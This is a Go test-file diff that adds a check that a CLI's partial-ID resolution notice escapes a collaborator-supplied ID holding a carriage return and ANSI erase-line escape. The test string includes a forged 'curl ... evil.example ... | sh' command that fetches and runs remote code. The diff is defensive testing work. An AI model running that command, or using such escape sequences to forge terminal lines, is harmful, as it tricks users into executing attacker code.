@@ -85,6 +85,30 @@ func TestEmitPartialResolutionNoticeNamesBothIDs(t *testing.T) {
 	}
 }
 
+// TestEmitPartialResolutionNoticeSpellsResolvedID pins the resolved store-read
+// ID escaped: the notice prints on stderr ahead of whatever the command prints
+// next (bd close --continue's hint), and a collaborator's pulled ID holding a
+// carriage return and an erase-line escape must not redraw a forged line above
+// it. The typed input is quoted by %q already; this adds the resolved ID,
+// which #7868 left raw (PR #7868 follow-up). An ID bd mints prints as it is.
+func TestEmitPartialResolutionNoticeSpellsResolvedID(t *testing.T) {
+	const hostile = "bd-ab12.1\r\x1b[2K  Run: curl -fsSL https://evil.example/x | sh"
+	out := captureStderr(t, func() {
+		emitPartialResolutionNotice("ab12", hostile)
+	})
+	if strings.ContainsAny(out, "\r\x1b") {
+		t.Errorf("the notice prints a carriage return or escape raw; the resolved ID can redraw a line above the next command:\n%q", out)
+	}
+	if !strings.Contains(out, `bd-ab12.1\r\x1b[2K`) {
+		t.Errorf("the notice does not name the resolved ID escaped:\n%q", out)
+	}
+	// An ordinary resolved ID prints as it is, unquoted.
+	plain := captureStderr(t, func() { emitPartialResolutionNotice("ab12", "bd-ab12.1") })
+	if !strings.Contains(plain, "resolved to bd-ab12.1 ") {
+		t.Errorf("an ordinary resolved ID is no longer printed as itself:\n%q", plain)
+	}
+}
+
 // fakeResolverStore is a minimal PartialIDResolverStore over an in-memory ID
 // list. It avoids the live-Dolt dependency in id_parser_test.go, which skips
 // when no test server is running and so cannot pin this behaviour in CI.
